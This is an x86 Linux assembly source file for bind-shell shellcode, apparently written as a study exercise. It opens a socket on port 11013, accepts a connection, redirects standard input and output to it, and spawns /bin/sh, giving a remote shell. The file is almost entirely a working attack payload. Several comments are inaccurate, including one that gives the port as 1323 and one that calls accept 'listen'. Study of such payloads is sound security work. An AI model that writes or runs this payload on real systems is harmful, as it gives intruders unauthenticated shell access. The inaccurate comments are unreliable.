; Content:	bind_shell
; Author: 	
; Date: 	02/2019
;
;
; For testing connect via 'nc -v localhost 11013'
;
; bind port can be changed easily in line 41!
;
;

section .text
global _start

_start:
	; [Step 1] setup socket
	push 0x66		; sys_socketcall
	pop eax			; move sys_socketcall 102 into eax

	xor ebx, ebx	; Zero out ebx	
	inc ebx			; Increment ebx by 1. It is equal to 1 now.
	
	; Three arguements.
	; Currently ebx=1
	xor esi,esi		; Zero out esi

	; Currently esi=0
	push esi		; Third arguement: IPPROTO_IP	= 0 
	push ebx		; Second arguement: SOCK_STREAM	= 1 
	push byte 0x2	; First arguement: AF_INET	= 2

	mov ecx,esp	    ; save pointer to socket() args

	int 0x80		; exec sys_socketcall

	mov edi, eax		; save sockfd result 

	; [+] bind port
	; Currently esi=0, ebx=1, edi= sockfd status
    xor eax, eax		; Zero out eax
    mov al, 0x66		; move sys_socketcall 102 into eax

    ; Arguments
	push esi			; address = 0 (any addresses)
	push dword 0x052B	; port = 1323
	inc ebx				; Increment ebx by 1. ebx = 2 now
	; Currently esi=0, ebx=2, edi= sockfd status
	push bx				; AF_INET	= 2
	mov ecx,esp         ;    

	; arguments for bind()
	; 0x10 = 16
	; Currently esi=0, ebx=2, edi= sockfd status
	push 0x10			; addrlen 	= 0.0.0.0 (16 bits)
	push ecx            ; addr to bind struct
	push edi            ; saved socketfd status
	mov ecx,esp         ; 	

	int 0x80                ; exec bind


	; [+] setup listener
    xor eax, eax		; Zero out eax
    mov al, 0x66		; move sys_socketcall 102 into eax
	xor ebx, ebx		; Zero out ebx
	mov bl, 0x4			; move 4 into ebx. 4 is listen

	push esi                ; Second arguement: backlog = 0
	push edi                ; First arguement: socketfd status
	mov ecx,esp             ;
	int 0x80                ; exec listen

	; accept incomming connections
    
    xor eax, eax		; Zero out eax
    mov al, 0x66		; move sys_socketcall 102 into eax
	xor ebx, ebx		;
	mov bl, 0x5			; move 5 into ebx. 5 is listen

	push esi                ; Third arguement: Do not need so equal to NULL
	push esi                ; Second arguement: Do not need so equal to NULL
	push edi                ; First arguement: socketfd status
	mov ecx,esp             ;
	int 0x80                ; exec accept

	mov edi, eax            ; save fd

	; Copies 3 file descriptions STDIN, STDOUT, STDERR using dup2
    mov ebx, edi        ; Move socketfd status into ebx
    xor ecx, ecx		; Zero out ecx
    mov cl,0x2			; move 2 into ecx. 2 is counter. Set up loopCounter
loop:
	mov al, 0x3F            ; move 63 into eax. 63 is dup2 
	int 0x80				; exec dup2
	dec ecx                 ; ecx - 1

	jns loop				; jmp back to beginning of loop if it's bigger or equal to 0

	; Shell using execve

	mov al, 0xB             ; move 11 into eax. 11 is execve

	push esi                ; Third arguement to 0
	push dword 0x68732f2f   ; Second arguement: "//sh"
	push dword 0x6e69622f   ; First arguement: "/bin"
	mov ebx,esp             ; filename = "/bin//sh\x0". save pointer to filename

	push esi
	push ebx
	mov ecx, esp            ; argv = [filename, 0] 

	mov edx, esi            ; edx = 0

	int 0x80                ; exec execve 